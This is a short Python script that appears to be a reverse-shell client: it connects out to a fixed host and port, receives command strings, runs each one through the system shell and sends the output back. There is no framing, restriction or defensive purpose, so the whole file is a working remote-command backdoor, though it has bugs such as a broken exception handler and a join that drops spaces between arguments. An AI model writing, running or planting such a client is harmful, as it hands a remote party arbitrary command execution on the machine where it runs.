import socket
import subprocess

HEADER = 16
FORMAT = "utf-8"

IP = "192.168.86.26"
PORT = 5555
ADDR = (IP, PORT)

class Network:
    def __init__(self, conn):
        self.conn = conn

    #Client
    def recv_handler(self, msg):
        msg = str(msg)
        args = msg.split(" ")
        command = args.pop(0).upper()

        return command, args

    def recv(self):
        msg_length = self.conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = self.conn.recv(msg_length).decode(FORMAT)
            return msg

    def send_handler(self, command, args):
        command = str(command)
        return self.send(command + " " + args)

    def send(self, msg):
        msg = str(msg)
        message = msg.encode(FORMAT)
        msg_length = len(message)
        send_length = str(msg_length).encode(FORMAT)
        send_length += b" " * (HEADER - len(send_length))
        self.conn.send(send_length)
        self.conn.send(message)


    def close_conn(self):
        self.conn.close()

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect(ADDR)
except:
    print("Could Not Connect To Server")

n = Network(client)

connected = True
while connected:
    try:
        msg = n.recv()
        msg = n.recv_handler(msg)
        command = msg[0]
        args = msg[1]

        if command == "GET_CWD":
            proc = subprocess.Popen("cd", stdout=subprocess.PIPE, shell=True)
            (out, err) = proc.communicate()
            n.send_handler("CWD", str(out))
        else:
            proc = subprocess.Popen("".join(args), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, )
            (out, err) = proc.communicate()
            err = str(err)
            if err != "b''":
                err = err.replace("\"", "\'")
                n.send_handler("OUTPUT", str(err))
            else:
                n.send_handler("OUTPUT", str(out))
    except err:
        print("Connection Lost")
        print(err)
        connected = False
        n.close_conn()
